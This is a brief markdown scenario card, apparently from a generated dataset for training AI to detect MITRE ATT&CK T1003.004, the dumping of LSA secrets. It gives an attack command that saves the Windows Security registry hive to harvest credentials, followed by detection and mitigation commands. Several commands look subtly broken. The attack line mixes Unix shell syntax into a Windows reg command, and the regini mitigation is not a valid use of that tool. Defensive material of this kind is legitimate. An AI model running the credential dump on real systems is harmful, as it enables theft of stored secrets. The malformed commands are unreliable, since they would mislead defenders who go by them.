---
type: campaign
scenario_id: 69
tactic: Credential Access
technique: "T1003.004: LSA Secrets"
technique_id: T1003.004
tags: [campaign, lotl, credential_access]
---

# Dumping LSA secrets using reg save.

## Threat Description
Dumping LSA secrets using reg save.

## Attack Command
```
reg save HKLM\Security $(echo lsa$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).hiv)
```

## Detection Logic
Monitor reg save: `wmic process where name='reg.exe' get commandline | findstr Security`; Event ID 4663.

## Mitigation
Restrict Security hive: `regini -h deny HKLM\Security`; Enable LSA protection: `reg add HKLM\System\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1`.

## AI Training Prompt
Train AI to detect LSA secrets dumping and suggest LSA protections.

## References
- MITRE ATT&CK T1003.004: https://attack.mitre.org/techniques/T1003/004/
- CWE-522: https://cwe.mitre.org/data/definitions/522.html
